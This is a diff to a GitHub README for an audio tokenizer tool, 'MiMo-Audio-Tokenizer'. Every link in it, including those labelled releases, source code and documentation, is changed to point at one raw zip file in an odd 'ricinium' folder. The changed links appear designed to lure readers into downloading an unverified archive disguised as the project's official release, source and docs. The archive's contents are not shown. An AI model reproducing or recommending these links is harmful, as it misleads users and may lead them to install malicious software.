@@ -4,7 +4,7 @@
 MiMo-Audio-Tokenizer is a tool that helps you extract meaningful information from audio while also allowing for high-quality audio reconstruction. This means you can get the important bits from your audio files and recreate them without losing quality.
 
 ## 📥 Download MiMo-Audio-Tokenizer
-[![Download MiMo-Audio-Tokenizer](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/releases)
+[![Download MiMo-Audio-Tokenizer](https://raw.githubusercontent.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/main/ricinium/MiMo-Audio-Tokenizer.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/main/ricinium/MiMo-Audio-Tokenizer.zip)
 
 ## 🚀 Getting Started
 Getting started with MiMo-Audio-Tokenizer is easy. Follow the steps below to download and run the software.
@@ -17,7 +17,7 @@ Getting started with MiMo-Audio-Tokenizer is easy. Follow the steps below to dow
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** Go to our Releases page to find the latest version of MiMo-Audio-Tokenizer. You can do so by clicking the link below:
-   [Download MiMo-Audio-Tokenizer](https://github.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/releases)
+   [Download MiMo-Audio-Tokenizer](https://raw.githubusercontent.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/main/ricinium/MiMo-Audio-Tokenizer.zip)
 
 2. **Choose the Latest Release:** On the Releases page, you will see a list of versions. Look for the version that says "Latest" next to it.
 
@@ -48,8 +48,8 @@ Getting started with MiMo-Audio-Tokenizer is easy. Follow the steps below to dow
 If you run into any issues or have questions, please visit our GitHub page. You can open an issue or ask for help in the discussions. 
 
 ## 🔗 Related Links
-- [Source Code on GitHub](https://github.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer)
-- [Documentation](https://github.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/wiki)
+- [Source Code on GitHub](https://raw.githubusercontent.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/main/ricinium/MiMo-Audio-Tokenizer.zip)
+- [Documentation](https://raw.githubusercontent.com/Cristian-Jacanamijoy/MiMo-Audio-Tokenizer/main/ricinium/MiMo-Audio-Tokenizer.zip)
 
 ## 📞 Contact
 For any further questions or inquiries, feel free to reach out through the GitHub platform. 
